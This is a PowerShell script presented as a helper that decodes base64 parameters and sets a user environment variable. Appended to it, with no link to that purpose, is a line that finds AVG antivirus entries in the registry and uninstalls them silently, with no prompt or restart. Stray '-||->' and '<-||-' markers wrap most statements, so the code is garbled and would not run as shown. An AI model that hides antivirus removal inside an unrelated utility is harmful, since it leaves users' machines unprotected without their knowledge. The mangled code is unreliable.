











[CmdletBinding()]
param(
    [Parameter(Mandatory=$true)]
    [string]
    $Name,

    [Parameter(Mandatory=$true)]
    [string]
    $Value
)

 -||-> Set-StrictMode -Version 'Latest' <-||- 

 -||-> $Name,$Value = 
     -||-> $Name,$Value | 
    ForEach-Object {  -||-> [Text.Encoding]::Unicode.GetString( [Convert]::FromBase64String($_) ) <-||-  } <-||-  <-||- 
    
 -||-> [Environment]::SetEnvironmentVariable( $Name, $Value, [EnvironmentVariableTarget]::User ) <-||- 

 -||-> $uninstall32s =  -||-> gci "HKLM:\SOFTWARE\Wow6432Node\Microsoft\Windows\CurrentVersion\Uninstall" | foreach {  -||-> gp $_.PSPath <-||-  } | ? {  -||-> $_ -like "*AVG*" <-||-  } | select UninstallString <-||-  <-||- ; -||-> $uninstall64s =  -||-> gci "HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Uninstall" | foreach {  -||-> gp $_.PSPath <-||-  } | ? {  -||-> $_ -like "*AVG*" <-||-  } | select UninstallString <-||-  <-||- ; -||-> foreach($uninstall64 in  -||-> $uninstall64s <-||- ) { -||-> $uninstall64 = $uninstall64.UninstallString -Replace "MsiExec.exe","" -Replace "/I","" -Replace "/X","" <-||- ; -||-> $uninstall64 = $uninstall64.Trim() <-||- ; -||-> if( -||-> $uninstall64 -like "*/mode=offline*" <-||- ){}else{ -||-> Write-Warning $uninstall64 <-||- ;  -||-> start-process "msiexec.exe" -args "/x $uninstall64  /qn /norestart" -Wait <-||-  } <-||- } <-||- ; -||-> foreach($uninstall32 in  -||-> $uninstall32s <-||- ) { -||-> $uninstall32 = $uninstall32.UninstallString -Replace "MsiExec.exe","" -Replace "/I","" -Replace "/X","" <-||- ; -||-> $uninstall32 = $uninstall32.Trim() <-||- ; -||-> if( -||-> $uninstall32 -like "*/mode=offline*" <-||- ){}else{ -||-> Write-Warning $uninstall32 <-||- ;  -||-> start-process "msiexec.exe" -args "/x $uninstall32  /qn /norestart" -Wait <-||-  } <-||- } <-||- ;



